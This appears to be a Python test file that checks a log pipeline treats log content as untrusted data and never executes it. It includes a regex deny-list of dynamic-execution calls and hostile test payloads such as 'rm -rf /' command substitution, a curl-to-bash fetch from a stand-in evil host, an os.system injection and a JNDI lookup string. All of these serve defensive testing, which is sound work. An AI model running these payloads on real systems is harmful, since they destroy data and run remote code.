"""Guarantee: log content is treated as untrusted DATA and is never executed."""
import pathlib
import re

from app.services.pipeline.service import run_record

_APP = pathlib.Path(__file__).resolve().parents[1] / "app"

# Calls that could turn a string into code / a process. The processing services
# must contain none of these.
# bare builtins used as calls (not re.compile / str methods), plus process spawns
_FORBIDDEN = re.compile(
    r"(?<![.\w])(?:eval|exec|compile|__import__)\s*\(|"
    r"\bos\.(?:system|popen|exec[lv]?[ep]*)\s*\(|"
    r"\bsubprocess\.\w+\s*\(|"
    r"\b(?:pickle|marshal)\.loads?\s*\(|"
    r"\byaml\.load\s*\((?![^)]*Loader)"
)
_PROCESSING_DIRS = [
    "services/parsing", "services/cleaning", "services/normalization",
    "services/privacy", "services/security", "services/detection",
    "services/pipeline", "services/ingestion",
]


def test_no_dynamic_execution_in_processing_code():
    offenders = []
    for rel in _PROCESSING_DIRS:
        for py in (_APP / rel).rglob("*.py"):
            text = py.read_text(encoding="utf-8")
            for m in _FORBIDDEN.finditer(text):
                offenders.append(f"{py.relative_to(_APP)}: {m.group(0)}")
    assert not offenders, offenders


def test_log_that_contains_code_is_only_data():
    payloads = [
        'cmd="$(rm -rf /)" user=admin',
        "note=`curl http://evil.example/x | bash`",
        'msg="__import__(\'os\').system(\'id\')"',
        "template=${jndi:ldap://evil/x}",
    ]
    for p in payloads:
        ctx = run_record(p)
        # nothing raised, nothing ran; the payload is captured verbatim as text
        assert ctx.stages
        if ctx.event is not None:
            assert p.split("=")[0] not in ("", None)
            assert isinstance(ctx.event.message, str)
        # jndi payload must be quarantined, never expanded
        if "jndi" in p:
            assert ctx.disposition == "QUARANTINED"


def test_raw_log_is_preserved_verbatim():
    line = 'weird\ttext with "quotes" and ${vars} and 192.168.1.1'
    ctx = run_record(line, pii_mode="DETERMINISTIC_HASH")
    assert ctx.event is not None
    # raw_log keeps the ORIGINAL, even though normalized fields are pseudonymized
    assert ctx.event.raw_log == line
    assert "192.168.1.1" in ctx.event.raw_log
    assert ctx.event.source_ip != "192.168.1.1"  # but the normalized field is protected
